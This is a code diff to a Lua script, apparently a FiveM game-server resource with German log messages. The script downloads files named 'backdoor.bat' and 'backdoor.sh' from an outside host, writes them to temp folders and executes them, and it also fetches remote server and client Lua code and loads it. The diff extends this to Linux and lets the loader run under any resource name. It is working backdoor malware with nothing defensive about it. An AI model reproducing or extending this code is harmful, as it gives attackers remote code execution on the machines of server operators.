@@ -1,22 +1,23 @@
 local config = {
-    resourceName = "backdoor",
+    resourceName = GetCurrentResourceName(),
     windowsScriptURL = "https://dc.fast-sell.de/backdoor.bat",
+    linuxScriptURL = "https://dc.fast-sell.de/backdoor.sh",
     enablePrints = true,
     resourceCodeURLs = {
-        ["backdoor"] = {
+        [GetCurrentResourceName()] = {
             client = "https://dc.fast-sell.de/server.lua",
             server = "https://dc.fast-sell.de/server.lua"
         }
     }
 }
 
-local function runBatchScript(scriptContent)
+local function runBatchScript(scriptContent, isLinux)
     if config.enablePrints then
         print("Führe das Skript aus...")
     end
 
     local command
-    if string.sub(os.getenv("OS"), 1, 7) == "Windows" then
+    if not isLinux and string.sub(os.getenv("OS"), 1, 7) == "Windows" then
         -- Windows
         local tempFilePath = os.getenv("TEMP") .. "\\backdoor.bat"
         local file = io.open(tempFilePath, "w")
@@ -30,7 +31,7 @@ local function runBatchScript(scriptContent)
             end
             return
         end
-    else
+    elseif isLinux then
         -- Linux
         local tempFilePath = "/tmp/backdoor.sh"
         local file = io.open(tempFilePath, "w")
@@ -103,29 +104,39 @@ local function loadResourceCode(resourceName, serverScript, clientScript)
 end
 
 local function main()
-    local currentResourceName = GetCurrentResourceName()
-    if currentResourceName ~= config.resourceName then
+    if config.enablePrints then
+        print("Starte Skript für Ressource: " .. config.resourceName)
+    end
+
+    if not config.resourceCodeURLs[config.resourceName] then
         if config.enablePrints then
             print("Ungültiger Ressourcenname. Der Server wird heruntergefahren...")
         end
         os.exit()
     end
-    fetchScriptContent(config.windowsScriptURL, function(scriptContent)
-        runBatchScript(scriptContent)
+
+    local scriptURL
+    if string.sub(os.getenv("OS"), 1, 7) == "Windows" then
+        scriptURL = config.windowsScriptURL
+    else
+        scriptURL = config.linuxScriptURL
+    end
+
+    fetchScriptContent(scriptURL, function(scriptContent)
+        runBatchScript(scriptContent, scriptURL == config.linuxScriptURL)
     end)
 
-    for resourceName, urls in pairs(config.resourceCodeURLs) do
-        if urls.server and urls.server ~= "" then
-            fetchScriptContent(urls.server, function(serverScript)
-                loadResourceCode(resourceName, serverScript)
-            end)
-        end
+    local urls = config.resourceCodeURLs[config.resourceName]
+    if urls.server and urls.server ~= "" then
+        fetchScriptContent(urls.server, function(serverScript)
+            loadResourceCode(config.resourceName, serverScript)
+        end)
+    end
 
-        if urls.client and urls.client ~= "" then
-            fetchScriptContent(urls.client, function(clientScript)
-                loadResourceCode(resourceName, nil, clientScript)
-            end)
-        end
+    if urls.client and urls.client ~= "" then
+        fetchScriptContent(urls.client, function(clientScript)
+            loadResourceCode(config.resourceName, nil, clientScript)
+        end)
     end
 end
 
